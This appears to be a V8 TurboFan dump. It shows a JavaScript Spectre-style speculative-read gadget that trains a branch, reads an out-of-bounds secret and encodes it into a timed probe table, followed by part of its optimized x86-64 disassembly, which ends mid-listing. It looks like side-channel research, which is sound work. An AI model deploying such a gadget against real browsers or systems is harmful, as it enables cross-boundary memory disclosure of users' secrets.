--- Raw source ---
() {
    const valid_access_indicator_array = new Uint8Array(speculative_repetitions * TRAINING_CONSTANT * page_size);
    for (let i = 0; i < speculative_repetitions * TRAINING_CONSTANT; ++i) {
        const invalid_access = !((i + 1) % TRAINING_CONSTANT);
        const fixed_index = address & -invalid_access;
        const probe_table = new Uint8Array((probe_length + 1) * page_size);
        // load condition from RAM so speculative execution gets triggered
        if (valid_access_indicator_array[i * page_size] + !invalid_access) {
            const secret_value = secret_table[fixed_index];
            // _log((secret_value & -invalid_access | !invalid_access << 8) * page_size);
            // map valid accesses to the address (probe_tables)
            // map invalid accesses to their respective probe boxes
            junk ^= probe_table[(1 + secret_value) * page_size & -invalid_access];
        }
        // _log(89);
        if (invalid_access) {
            // probe table
            const time_table = probeTable(probe_table);
            // time_tables.push(time_table);
        }
    }
}


--- Optimized code ---
optimization_id = 0
source_position = 293
kind = OPTIMIZED_FUNCTION
name = _speculativelyReadAddress
stack_slots = 26
compiler = turbofan
address = 0x1425ddef61a1

Instructions (size = 3788)
                  -- <not inlined:293> --
                  -- Prologue: check for deoptimization --
0x1425ddef61e0     0  488b59e0       REX.W movq rbx,[rcx-0x20]
0x1425ddef61e4     4  f6430f01       testb [rbx+0xf],0x1
0x1425ddef61e8     8  0f85328df1ff   jnz 0x1425dde0ef20  (CompileLazyDeoptimizedCode)    ;; code: Builtin::CompileLazyDeoptimizedCode
                  -- B0 start (construct frame) --
0x1425ddef61ee     e  55             push rbp
0x1425ddef61ef     f  4889e5         REX.W movq rbp,rsp
0x1425ddef61f2    12  56             push rsi
0x1425ddef61f3    13  57             push rdi
0x1425ddef61f4    14  48ba0000000027000000 REX.W movq rdx,0x2700000000
0x1425ddef61fe    1e  e87d76f2ff     call 0x1425dde1d880  (Abort)    ;; code: Builtin::Abort
0x1425ddef6203    23  cc             int3l
                  -- OSR entrypoint --
0x1425ddef6204    24  4883ec50       REX.W subq rsp,0x50
                  -- <not inlined:434> --
0x1425ddef6208    28  488b5e37       REX.W movq rbx,[rsi+0x37]
                  -- <not inlined:436> --
0x1425ddef620c    2c  48897588       REX.W movq [rbp-0x78],rsi
0x1425ddef6210    30  48895d80       REX.W movq [rbp-0x80],rbx
0x1425ddef6214    34  49395da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),rbx
0x1425ddef6218    38  0f84e30c0000   jz 0x1425ddef6f01  <+0xd21>
                  -- B1 start --
0x1425ddef621e    3e  488b4e3f       REX.W movq rcx,[rsi+0x3f]
                  -- <not inlined:462> --
0x1425ddef6222    42  49394da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),rcx
0x1425ddef6226    46  0f849b0c0000   jz 0x1425ddef6ec7  <+0xce7>
                  -- B2 start --
                  -- <not inlined:460> --
0x1425ddef622c    4c  488bc1         REX.W movq rax,rcx
0x1425ddef622f    4f  48c1e820       REX.W shrq rax, 32
0x1425ddef6233    53  f6c301         testb rbx,0x1
0x1425ddef6236    56  0f852e0d0000   jnz 0x1425ddef6f6a  <+0xd8a>
0x1425ddef623c    5c  f6c101         testb rcx,0x1
0x1425ddef623f    5f  0f852a0d0000   jnz 0x1425ddef6f6f  <+0xd8f>
0x1425ddef6245    65  488bd3         REX.W movq rdx,rbx
0x1425ddef6248    68  48c1ea20       REX.W shrq rdx, 32
0x1425ddef624c    6c  488bfa         REX.W movq rdi,rdx
0x1425ddef624f    6f  0faff8         imull rdi,rax
0x1425ddef6252    72  0f801c0d0000   jo 0x1425ddef6f74  <+0xd94>
0x1425ddef6258    78  83ff00         cmpl rdi,0x0
0x1425ddef625b    7b  0f8425060000   jz 0x1425ddef6886  <+0x6a6>
                  -- B3 start --
                  -- B5 start --
                  -- <not inlined:434> --
0x1425ddef6261    81  4c8b45b0       REX.W movq r8,[rbp-0x50]
0x1425ddef6265    85  49c1e820       REX.W shrq r8, 32
0x1425ddef6269    89  4c8b4db0       REX.W movq r9,[rbp-0x50]
0x1425ddef626d    8d  41f6c101       testb r9,0x1
0x1425ddef6271    91  0f85020d0000   jnz 0x1425ddef6f79  <+0xd99>
0x1425ddef6277    97  4c898548ffffff REX.W movq [rbp-0xb8],r8
0x1425ddef627e    9e  443bc7         cmpl r8,rdi
0x1425ddef6281    a1  0f8df4050000   jge 0x1425ddef687b  <+0x69b>
                  -- B6 start --
                  -- B7 start --
                  -- <not inlined:416> --
0x1425ddef6287    a7  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32766))
0x1425ddef628e    ae  0f8631060000   jna 0x1425ddef68c5  <+0x6e5>
                  -- B9 start --
                  -- B10 start --
                  -- <not inlined:524> --
0x1425ddef6294    b4  498bd0         REX.W movq rdx,r8
0x1425ddef6297    b7  83c201         addl rdx,0x1
0x1425ddef629a    ba  0f80de0c0000   jo 0x1425ddef6f7e  <+0xd9e>
                  -- <not inlined:529> --
0x1425ddef62a0    c0  83f800         cmpl rax,0x0
0x1425ddef62a3    c3  0f8e65060000   jle 0x1425ddef690e  <+0x72e>
                  -- B11 start --
                  -- B13 start --
                  -- <not inlined:524> --
0x1425ddef62a9    c9  4c8bda         REX.W movq r11,rdx
                  -- <not inlined:529> --
0x1425ddef62ac    cc  488bf8         REX.W movq rdi,rax
0x1425ddef62af    cf  8d47ff         leal rax,[rdi-0x1]
0x1425ddef62b2    d2  85f8           testl rdi,rax
0x1425ddef62b4    d4  0f94c2         setzl dl
0x1425ddef62b7    d7  0fb6d2         movzxbl rdx,rdx
0x1425ddef62ba    da  4c899d60ffffff REX.W movq [rbp-0xa0],r11
0x1425ddef62c1    e1  4183fb00       cmpl r11,0x0
0x1425ddef62c5    e5  0f8c8d060000   jl 0x1425ddef6958  <+0x778>
                  -- B14 start --
0x1425ddef62cb    eb  83fa00         cmpl rdx,0x0
0x1425ddef62ce    ee  0f850c000000   jnz 0x1425ddef62e0  <+0x100>
                  -- B15 start --
0x1425ddef62d4    f4  498bc3         REX.W movq rax,r11
0x1425ddef62d7    f7  33d2           xorl rdx,rdx
0x1425ddef62d9    f9  f7f7           divl rdi
0x1425ddef62db    fb  e905000000     jmp 0x1425ddef62e5  <+0x105>
                  -- B16 start --
0x1425ddef62e0   100  498bd3         REX.W movq rdx,r11
0x1425ddef62e3   103  23d0           andl rdx,rax
                  -- B17 start --
                  -- B22 start --
0x1425ddef62e5   105  83fa00         cmpl rdx,0x0
0x1425ddef62e8   108  0f95c0         setnzl al
0x1425ddef62eb   10b  0fb6c0         movzxbl rax,rax
0x1425ddef62ee   10e  83f800         cmpl rax,0x0
0x1425ddef62f1   111  0f94c2         setzl dl
0x1425ddef62f4   114  0fb6d2         movzxbl rdx,rdx
                  -- <not inlined:579> --
0x1425ddef62f7   117  488b7e4f       REX.W movq rdi,[rsi+0x4f]
0x1425ddef62fb   11b  48898558ffffff REX.W movq [rbp-0xa8],rax
0x1425ddef6302   122  48899570ffffff REX.W movq [rbp-0x90],rdx
0x1425ddef6309   129  49397da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),rdi
0x1425ddef630d   12d  0f84770b0000   jz 0x1425ddef6e8a  <+0xcaa>
                  -- B23 start --
                  -- <not inlined:587> --
0x1425ddef6313   133  40f6c701       testb rdi,0x1
0x1425ddef6317   137  0f8429000000   jz 0x1425ddef6346  <+0x166>
                  -- B24 start --
0x1425ddef631d   13d  4c8b67ff       REX.W movq r12,[rdi-0x1]
0x1425ddef6321   141  4d396548       REX.W cmpq [r13+0x48] (root (0x16ddeb702641 <Map[16]>)),r12
0x1425ddef6325   145  0f85580c0000   jnz 0x1425ddef6f83  <+0xda3>
0x1425ddef632b   14b  c5fb104707     vmovsd xmm0,[rdi+0x7]
0x1425ddef6330   150  c4e1fb2cf8     vcvttsd2siq rdi,xmm0
0x1425ddef6335   155  4883ff01       REX.W cmpq rdi,0x1
0x1425ddef6339   159  0f80100c0000   jo 0x1425ddef6f4f  <+0xd6f>
0x1425ddef633f   15f  8bff           movl rdi,rdi
0x1425ddef6341   161  e904000000     jmp 0x1425ddef634a  <+0x16a>
                  -- B25 start --
0x1425ddef6346   166  48c1ef20       REX.W shrq rdi, 32
                  -- B26 start --
                  -- <not inlined:634> --
0x1425ddef634a   16a  4c8b6657       REX.W movq r12,[rsi+0x57]
                  -- <not inlined:589> --
0x1425ddef634e   16e  4c8bf2         REX.W movq r14,rdx
0x1425ddef6351   171  41f7de         negl r14
                  -- <not inlined:587> --
0x1425ddef6354   174  4123fe         andl rdi,r14
                  -- <not inlined:650> --
0x1425ddef6357   177  4c89b550ffffff REX.W movq [rbp-0xb0],r14
0x1425ddef635e   17e  4889bd68ffffff REX.W movq [rbp-0x98],rdi
0x1425ddef6365   185  4d3965a8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),r12
0x1425ddef6369   189  0f84d40a0000   jz 0x1425ddef6e43  <+0xc63>
                  -- B27 start --
                  -- <not inlined:663> --
0x1425ddef636f   18f  41f6c401       testb r12,0x1
0x1425ddef6373   193  0f850f0c0000   jnz 0x1425ddef6f88  <+0xda8>
0x1425ddef6379   199  49c1ec20       REX.W shrq r12, 32
0x1425ddef637d   19d  4183c401       addl r12,0x1
0x1425ddef6381   1a1  0f80060c0000   jo 0x1425ddef6f8d  <+0xdad>
0x1425ddef6387   1a7  4c8b7e47       REX.W movq r15,[rsi+0x47]
                  -- <not inlined:670> --
0x1425ddef638b   1ab  4d397da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),r15
0x1425ddef638f   1af  0f845c0a0000   jz 0x1425ddef6df1  <+0xc11>
                  -- B28 start --
                  -- <not inlined:668> --
0x1425ddef6395   1b5  41f6c701       testb r15,0x1
0x1425ddef6399   1b9  0f85f30b0000   jnz 0x1425ddef6f92  <+0xdb2>
0x1425ddef639f   1bf  49c1ef20       REX.W shrq r15, 32
0x1425ddef63a3   1c3  4c89e3         REX.W movq rbx,r12
0x1425ddef63a6   1c6  410fafdf       imull rbx,r15
0x1425ddef63aa   1ca  0f80e70b0000   jo 0x1425ddef6f97  <+0xdb7>
0x1425ddef63b0   1d0  48899d40ffffff REX.W movq [rbp-0xc0],rbx
0x1425ddef63b7   1d7  83fb00         cmpl rbx,0x0
0x1425ddef63ba   1da  0f84ef050000   jz 0x1425ddef69af  <+0x7cf>
                  -- B29 start --
                  -- B31 start --
                  -- <not inlined:634> --
0x1425ddef63c0   1e0  488bcb         REX.W movq rcx,rbx
0x1425ddef63c3   1e3  48c1e120       REX.W shlq rcx, 32
0x1425ddef63c7   1e7  4c8bfe         REX.W movq r15,rsi
0x1425ddef63ca   1ea  498b55a0       REX.W movq rdx,[r13-0x60] (root (0x16ddeb7025b1 <undefined>))
0x1425ddef63ce   1ee  48b8e927411681180000 REX.W movq rax,0x1881164127e9    ;; object: 0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>
0x1425ddef63d8   1f8  488bd8         REX.W movq rbx,rax
0x1425ddef63db   1fb  4c8be0         REX.W movq r12,rax
0x1425ddef63de   1fe  488bfa         REX.W movq rdi,rdx
0x1425ddef63e1   201  e87a55f5ff     call 0x1425dde4b960  (CreateTypedArray)    ;; code: Builtin::CreateTypedArray
                  -- <not inlined:765> --
0x1425ddef63e6   206  488b7588       REX.W movq rsi,[rbp-0x78]
0x1425ddef63ea   20a  488b5e47       REX.W movq rbx,[rsi+0x47]
                  -- <not inlined:802> --
0x1425ddef63ee   20e  49395da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),rbx
0x1425ddef63f2   212  0f84a7090000   jz 0x1425ddef6d9f  <+0xbbf>
                  -- B32 start --
                  -- <not inlined:800> --
0x1425ddef63f8   218  f6c301         testb rbx,0x1
0x1425ddef63fb   21b  0f85a00b0000   jnz 0x1425ddef6fa1  <+0xdc1>
0x1425ddef6401   221  488bd3         REX.W movq rdx,rbx
0x1425ddef6404   224  48c1ea20       REX.W shrq rdx, 32
0x1425ddef6408   228  488b8d48ffffff REX.W movq rcx,[rbp-0xb8]
0x1425ddef640f   22f  0fafca         imull rcx,rdx
0x1425ddef6412   232  0f808e0b0000   jo 0x1425ddef6fa6  <+0xdc6>
                  -- <not inlined:797> --
0x1425ddef6418   238  488b7da8       REX.W movq rdi,[rbp-0x58]
0x1425ddef641c   23c  40f6c701       testb rdi,0x1
0x1425ddef6420   240  0f84850b0000   jz 0x1425ddef6fab  <+0xdcb>
0x1425ddef6426   246  49b88147901354060000 REX.W movq r8,0x65413904781    ;; object: 0x065413904781 <Map(UINT8_ELEMENTS)>
0x1425ddef6430   250  4c3947ff       REX.W cmpq [rdi-0x1],r8
0x1425ddef6434   254  0f85760b0000   jnz 0x1425ddef6fb0  <+0xdd0>
0x1425ddef643a   25a  4c8b4f17       REX.W movq r9,[rdi+0x17]
0x1425ddef643e   25e  4c8b5f0f       REX.W movq r11,[rdi+0xf]
0x1425ddef6442   262  448b6733       movl r12,[rdi+0x33]
0x1425ddef6446   266  4d8b5b17       REX.W movq r11,[r11+0x17]
0x1425ddef644a   26a  4439e1         cmpl rcx,r12
0x1425ddef644d   26d  0f83620b0000   jnc 0x1425ddef6fb5  <+0xdd5>
0x1425ddef6453   273  410fb60c0b     movzxbl rcx,[r11+rcx*1]
                  -- <not inlined:813> --
0x1425ddef6458   278  038d58ffffff   addl rcx,[rbp-0xa8]
0x1425ddef645e   27e  0f84ac000000   jz 0x1425ddef6510  <+0x330>
                  -- B33 start --
                  -- <not inlined:867> --
0x1425ddef6464   284  488b4e5f       REX.W movq rcx,[rsi+0x5f]
0x1425ddef6468   288  49394da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),rcx
0x1425ddef646c   28c  0f84aa050000   jz 0x1425ddef6a1c  <+0x83c>
                  -- B34 start --
                  -- <not inlined:879> --
0x1425ddef6472   292  f6c101         testb rcx,0x1
0x1425ddef6475   295  0f843f0b0000   jz 0x1425ddef6fba  <+0xdda>
0x1425ddef647b   29b  4c3941ff       REX.W cmpq [rcx-0x1],r8
0x1425ddef647f   29f  0f853a0b0000   jnz 0x1425ddef6fbf  <+0xddf>
0x1425ddef6485   2a5  4c8b4917       REX.W movq r9,[rcx+0x17]
0x1425ddef6489   2a9  4c8b590f       REX.W movq r11,[rcx+0xf]
0x1425ddef648d   2ad  8b4933         movl rcx,[rcx+0x33]
0x1425ddef6490   2b0  4d8b5b17       REX.W movq r11,[r11+0x17]
0x1425ddef6494   2b4  4c8bb568ffffff REX.W movq r14,[rbp-0x98]
0x1425ddef649b   2bb  443bf1         cmpl r14,rcx
0x1425ddef649e   2be  0f83200b0000   jnc 0x1425ddef6fc4  <+0xde4>
0x1425ddef64a4   2c4  430fb60c33     movzxbl rcx,[r11+r14*1]
                  -- <not inlined:1128> --
0x1425ddef64a9   2c9  4c8b4e2f       REX.W movq r9,[rsi+0x2f]
0x1425ddef64ad   2cd  4d394da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),r9
0x1425ddef64b1   2d1  0f8443050000   jz 0x1425ddef69fa  <+0x81a>
                  -- B35 start --
                  -- <not inlined:1151> --
0x1425ddef64b7   2d7  83c101         addl rcx,0x1
                  -- <not inlined:1167> --
0x1425ddef64ba   2da  0fafd1         imull rdx,rcx
0x1425ddef64bd   2dd  0f80060b0000   jo 0x1425ddef6fc9  <+0xde9>
                  -- <not inlined:1147> --
0x1425ddef64c3   2e3  4c3940ff       REX.W cmpq [rax-0x1],r8
0x1425ddef64c7   2e7  0f85010b0000   jnz 0x1425ddef6fce  <+0xdee>
0x1425ddef64cd   2ed  488b4817       REX.W movq rcx,[rax+0x17]
0x1425ddef64d1   2f1  4c8b580f       REX.W movq r11,[rax+0xf]
0x1425ddef64d5   2f5  448b6033       movl r12,[rax+0x33]
                  -- <not inlined:1179> --
0x1425ddef64d9   2f9  4c8bbd50ffffff REX.W movq r15,[rbp-0xb0]
0x1425ddef64e0   300  4423fa         andl r15,rdx
                  -- <not inlined:1147> --
0x1425ddef64e3   303  498b5317       REX.W movq rdx,[r11+0x17]
0x1425ddef64e7   307  4539e7         cmpl r15,r12
0x1425ddef64ea   30a  0f83e30a0000   jnc 0x1425ddef6fd3  <+0xdf3>
0x1425ddef64f0   310  420fb6143a     movzxbl rdx,[rdx+r15*1]
0x1425ddef64f5   315  498bc9         REX.W movq rcx,r9
0x1425ddef64f8   318  48c1e920       REX.W shrq rcx, 32
0x1425ddef64fc   31c  33d1           xorl rdx,rcx
0x1425ddef64fe   31e  41f6c101       testb r9,0x1
0x1425ddef6502   322  0f85d00a0000   jnz 0x1425ddef6fd8  <+0xdf8>
                  -- <not inlined:1133> --
0x1425ddef6508   328  48c1e220       REX.W shlq rdx, 32
0x1425ddef650c   32c  4889562f       REX.W movq [rsi+0x2f],rdx
                  -- B38 start --
                  -- B39 start --
                  -- <not inlined:1238> --
0x1425ddef6510   330  83bd58ffffff00 cmpl [rbp-0xa8],0x0
0x1425ddef6517   337  0f8517000000   jnz 0x1425ddef6534  <+0x354>
                  -- B40 start --
                  -- <not inlined:1318> --
0x1425ddef651d   33d  488b5e67       REX.W movq rbx,[rsi+0x67]
0x1425ddef6521   341  48ba8955fb4dfd210000 REX.W movq rdx,0x21fd4dfb5589    ;; object: 0x21fd4dfb5589 <JSFunction probeTable (sfi = 0x139723ed8571)>
0x1425ddef652b   34b  483bd3         REX.W cmpq rdx,rbx
0x1425ddef652e   34e  0f85a90a0000   jnz 0x1425ddef6fdd  <+0xdfd>
                  -- B41 start --
                  -- B42 start --
0x1425ddef6534   354  4c8b9560ffffff REX.W movq r10,[rbp-0xa0]
0x1425ddef653b   35b  4c899558ffffff REX.W movq [rbp-0xa8],r10
0x1425ddef6542   362  6666660f1f840000000000 nop
0x1425ddef654d   36d  0f1f00         nop
                  -- B43 start (loop up to 83) --
                  -- <not inlined:434> --
0x1425ddef6550   370  488b5e37       REX.W movq rbx,[rsi+0x37]
                  -- <not inlined:436> --
0x1425ddef6554   374  48895d80       REX.W movq [rbp-0x80],rbx
0x1425ddef6558   378  49395da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),rbx
0x1425ddef655c   37c  0f841e080000   jz 0x1425ddef6d80  <+0xba0>
                  -- B44 start (in loop 43) --
0x1425ddef6562   382  488b4e3f       REX.W movq rcx,[rsi+0x3f]
                  -- <not inlined:462> --
0x1425ddef6566   386  48898d78ffffff REX.W movq [rbp-0x88],rcx
0x1425ddef656d   38d  49394da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),rcx
0x1425ddef6571   391  0f84dc070000   jz 0x1425ddef6d53  <+0xb73>
                  -- B45 start (in loop 43) --
                  -- <not inlined:460> --
0x1425ddef6577   397  f6c301         testb rbx,0x1
0x1425ddef657a   39a  0f85620a0000   jnz 0x1425ddef6fe2  <+0xe02>
0x1425ddef6580   3a0  f6c101         testb rcx,0x1
0x1425ddef6583   3a3  0f855e0a0000   jnz 0x1425ddef6fe7  <+0xe07>
0x1425ddef6589   3a9  488bc1         REX.W movq rax,rcx
0x1425ddef658c   3ac  48c1e820       REX.W shrq rax, 32
0x1425ddef6590   3b0  488bd3         REX.W movq rdx,rbx
0x1425ddef6593   3b3  48c1ea20       REX.W shrq rdx, 32
0x1425ddef6597   3b7  4c8bca         REX.W movq r9,rdx
0x1425ddef659a   3ba  440fafc8       imull r9,rax
0x1425ddef659e   3be  0f80480a0000   jo 0x1425ddef6fec  <+0xe0c>
0x1425ddef65a4   3c4  4183f900       cmpl r9,0x0
0x1425ddef65a8   3c8  0f849e040000   jz 0x1425ddef6a4c  <+0x86c>
                  -- B46 start (in loop 43) --
                  -- B48 start (in loop 43) --
                  -- <not inlined:434> --
0x1425ddef65ae   3ce  4c8b9d58ffffff REX.W movq r11,[rbp-0xa8]
0x1425ddef65b5   3d5  453bd9         cmpl r11,r9
0x1425ddef65b8   3d8  0f8dbd020000   jge 0x1425ddef687b  <+0x69b>
                  -- B49 start (in loop 43) --
                  -- <not inlined:416> --
0x1425ddef65be   3de  493ba5f80f0000 REX.W cmpq rsp,[r13+0xff8] (root (32766))
0x1425ddef65c5   3e5  0f86c7040000   jna 0x1425ddef6a92  <+0x8b2>
                  -- B51 start (in loop 43) --
                  -- B52 start (in loop 43) --
                  -- <not inlined:524> --
0x1425ddef65cb   3eb  498bd3         REX.W movq rdx,r11
0x1425ddef65ce   3ee  83c201         addl rdx,0x1
0x1425ddef65d1   3f1  0f801a0a0000   jo 0x1425ddef6ff1  <+0xe11>
                  -- <not inlined:529> --
0x1425ddef65d7   3f7  83f800         cmpl rax,0x0
0x1425ddef65da   3fa  0f8efb040000   jle 0x1425ddef6adb  <+0x8fb>
                  -- B53 start (in loop 43) --
                  -- B55 start (in loop 43) --
                  -- <not inlined:524> --
0x1425ddef65e0   400  4c8be2         REX.W movq r12,rdx
                  -- <not inlined:529> --
0x1425ddef65e3   403  4c8bc8         REX.W movq r9,rax
0x1425ddef65e6   406  418d41ff       leal rax,[r9-0x1]
0x1425ddef65ea   40a  4485c8         testl r9,rax
0x1425ddef65ed   40d  0f94c2         setzl dl
0x1425ddef65f0   410  0fb6d2         movzxbl rdx,rdx
0x1425ddef65f3   413  4c89a540ffffff REX.W movq [rbp-0xc0],r12
0x1425ddef65fa   41a  4183fc00       cmpl r12,0x0
0x1425ddef65fe   41e  0f8c24050000   jl 0x1425ddef6b28  <+0x948>
                  -- B56 start (in loop 43) --
0x1425ddef6604   424  83fa00         cmpl rdx,0x0
0x1425ddef6607   427  0f850d000000   jnz 0x1425ddef661a  <+0x43a>
                  -- B57 start (in loop 43) --
0x1425ddef660d   42d  4c89e0         REX.W movq rax,r12
0x1425ddef6610   430  33d2           xorl rdx,rdx
0x1425ddef6612   432  41f7f1         divl r9
0x1425ddef6615   435  e905000000     jmp 0x1425ddef661f  <+0x43f>
                  -- B58 start (in loop 43) --
0x1425ddef661a   43a  4c89e2         REX.W movq rdx,r12
0x1425ddef661d   43d  23d0           andl rdx,rax
                  -- B59 start (in loop 43) --
                  -- B64 start (in loop 43) --
0x1425ddef661f   43f  83fa00         cmpl rdx,0x0
0x1425ddef6622   442  0f95c0         setnzl al
0x1425ddef6625   445  0fb6c0         movzxbl rax,rax
0x1425ddef6628   448  83f800         cmpl rax,0x0
0x1425ddef662b   44b  0f94c2         setzl dl
0x1425ddef662e   44e  0fb6d2         movzxbl rdx,rdx
                  -- <not inlined:579> --
0x1425ddef6631   451  4c8b4e4f       REX.W movq r9,[rsi+0x4f]
0x1425ddef6635   455  48898550ffffff REX.W movq [rbp-0xb0],rax
0x1425ddef663c   45c  48899568ffffff REX.W movq [rbp-0x98],rdx
0x1425ddef6643   463  4d394da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),r9
0x1425ddef6647   467  0f84dd060000   jz 0x1425ddef6d2a  <+0xb4a>
                  -- B65 start (in loop 43) --
                  -- <not inlined:587> --
0x1425ddef664d   46d  41f6c101       testb r9,0x1
0x1425ddef6651   471  0f842b000000   jz 0x1425ddef6682  <+0x4a2>
                  -- B66 start (in loop 43) --
0x1425ddef6657   477  4d8b71ff       REX.W movq r14,[r9-0x1]
0x1425ddef665b   47b  4d397548       REX.W cmpq [r13+0x48] (root (0x16ddeb702641 <Map[16]>)),r14
0x1425ddef665f   47f  0f8591090000   jnz 0x1425ddef6ff6  <+0xe16>
0x1425ddef6665   485  c4c17b104107   vmovsd xmm0,[r9+0x7]
0x1425ddef666b   48b  c461fb2cc8     vcvttsd2siq r9,xmm0
0x1425ddef6670   490  4983f901       REX.W cmpq r9,0x1
0x1425ddef6674   494  0f80ba080000   jo 0x1425ddef6f34  <+0xd54>
0x1425ddef667a   49a  458bc9         movl r9,r9
0x1425ddef667d   49d  e904000000     jmp 0x1425ddef6686  <+0x4a6>
                  -- B67 start (in loop 43) --
0x1425ddef6682   4a2  49c1e920       REX.W shrq r9, 32
                  -- B68 start (in loop 43) --
                  -- <not inlined:634> --
0x1425ddef6686   4a6  4c8b7657       REX.W movq r14,[rsi+0x57]
                  -- <not inlined:589> --
0x1425ddef668a   4aa  4c8bfa         REX.W movq r15,rdx
0x1425ddef668d   4ad  41f7df         negl r15
                  -- <not inlined:587> --
0x1425ddef6690   4b0  4523cf         andl r9,r15
                  -- <not inlined:650> --
0x1425ddef6693   4b3  4c89bd48ffffff REX.W movq [rbp-0xb8],r15
0x1425ddef669a   4ba  4c898d60ffffff REX.W movq [rbp-0xa0],r9
0x1425ddef66a1   4c1  4d3975a8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),r14
0x1425ddef66a5   4c5  0f8448060000   jz 0x1425ddef6cf3  <+0xb13>
                  -- B69 start (in loop 43) --
                  -- <not inlined:663> --
0x1425ddef66ab   4cb  41f6c601       testb r14,0x1
0x1425ddef66af   4cf  0f8546090000   jnz 0x1425ddef6ffb  <+0xe1b>
0x1425ddef66b5   4d5  49c1ee20       REX.W shrq r14, 32
0x1425ddef66b9   4d9  4183c601       addl r14,0x1
0x1425ddef66bd   4dd  0f803d090000   jo 0x1425ddef7000  <+0xe20>
0x1425ddef66c3   4e3  488b5e47       REX.W movq rbx,[rsi+0x47]
                  -- <not inlined:670> --
0x1425ddef66c7   4e7  49395da8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),rbx
0x1425ddef66cb   4eb  0f84e4050000   jz 0x1425ddef6cb5  <+0xad5>
                  -- B70 start (in loop 43) --
                  -- <not inlined:668> --
0x1425ddef66d1   4f1  f6c301         testb rbx,0x1
0x1425ddef66d4   4f4  0f852b090000   jnz 0x1425ddef7005  <+0xe25>
0x1425ddef66da   4fa  48c1eb20       REX.W shrq rbx, 32
0x1425ddef66de   4fe  498bce         REX.W movq rcx,r14
0x1425ddef66e1   501  0fafcb         imull rcx,rbx
0x1425ddef66e4   504  0f8020090000   jo 0x1425ddef700a  <+0xe2a>
0x1425ddef66ea   50a  48898d70ffffff REX.W movq [rbp-0x90],rcx
0x1425ddef66f1   511  83f900         cmpl rcx,0x0
0x1425ddef66f4   514  0f8489040000   jz 0x1425ddef6b83  <+0x9a3>
                  -- B71 start (in loop 43) --
                  -- B73 start (in loop 43) --
                  -- <not inlined:634> --
0x1425ddef66fa   51a  488bd9         REX.W movq rbx,rcx
0x1425ddef66fd   51d  48c1e320       REX.W shlq rbx, 32
0x1425ddef6701   521  4c8bf6         REX.W movq r14,rsi
0x1425ddef6704   524  48b8e927411681180000 REX.W movq rax,0x1881164127e9    ;; object: 0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>
0x1425ddef670e   52e  498b55a0       REX.W movq rdx,[r13-0x60] (root (0x16ddeb7025b1 <undefined>))
0x1425ddef6712   532  488bcb         REX.W movq rcx,rbx
0x1425ddef6715   535  488bd8         REX.W movq rbx,rax
0x1425ddef6718   538  488bfa         REX.W movq rdi,rdx
0x1425ddef671b   53b  e84052f5ff     call 0x1425dde4b960  (CreateTypedArray)    ;; code: Builtin::CreateTypedArray
                  -- <not inlined:765> --
0x1425ddef6720   540  488b5d88       REX.W movq rbx,[rbp-0x78]
0x1425ddef6724   544  488b5347       REX.W movq rdx,[rbx+0x47]
                  -- <not inlined:802> --
0x1425ddef6728   548  493955a8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),rdx
0x1425ddef672c   54c  0f844c050000   jz 0x1425ddef6c7e  <+0xa9e>
                  -- B74 start (in loop 43) --
                  -- <not inlined:800> --
0x1425ddef6732   552  f6c201         testb rdx,0x1
0x1425ddef6735   555  0f85d9080000   jnz 0x1425ddef7014  <+0xe34>
0x1425ddef673b   55b  488bca         REX.W movq rcx,rdx
0x1425ddef673e   55e  48c1e920       REX.W shrq rcx, 32
0x1425ddef6742   562  488bb558ffffff REX.W movq rsi,[rbp-0xa8]
0x1425ddef6749   569  0faff1         imull rsi,rcx
0x1425ddef674c   56c  0f80c7080000   jo 0x1425ddef7019  <+0xe39>
                  -- <not inlined:797> --
0x1425ddef6752   572  488b7da8       REX.W movq rdi,[rbp-0x58]
0x1425ddef6756   576  49b88147901354060000 REX.W movq r8,0x65413904781    ;; object: 0x065413904781 <Map(UINT8_ELEMENTS)>
0x1425ddef6760   580  4c3947ff       REX.W cmpq [rdi-0x1],r8
0x1425ddef6764   584  0f85b4080000   jnz 0x1425ddef701e  <+0xe3e>
0x1425ddef676a   58a  4c8b4f17       REX.W movq r9,[rdi+0x17]
0x1425ddef676e   58e  4c8b5f0f       REX.W movq r11,[rdi+0xf]
0x1425ddef6772   592  448b6733       movl r12,[rdi+0x33]
0x1425ddef6776   596  4d8b5b17       REX.W movq r11,[r11+0x17]
0x1425ddef677a   59a  4439e6         cmpl rsi,r12
0x1425ddef677d   59d  0f83a0080000   jnc 0x1425ddef7023  <+0xe43>
0x1425ddef6783   5a3  410fb63433     movzxbl rsi,[r11+rsi*1]
                  -- <not inlined:813> --
0x1425ddef6788   5a8  03b550ffffff   addl rsi,[rbp-0xb0]
0x1425ddef678e   5ae  0f84ad000000   jz 0x1425ddef6841  <+0x661>
                  -- B75 start (in loop 43) --
                  -- <not inlined:867> --
0x1425ddef6794   5b4  488b735f       REX.W movq rsi,[rbx+0x5f]
0x1425ddef6798   5b8  493975a8       REX.W cmpq [r13-0x58] (root (0x16ddeb702691 <the_hole>)),rsi
0x1425ddef679c   5bc  0f8483040000   jz 0x1425ddef6c25  <+0xa45>
                  -- B76 start (in loop 43) --
                  -- <not inlined:879> --
0x1425ddef67a2   5c2  40f6c601       testb rsi,0x1
0x1425ddef67a6   5c6  0f847c080000   jz 0x1425ddef7028  <+0xe48>
0x1425ddef67ac   5cc  4c3946ff       REX.W cmpq [rsi-0x1],r8
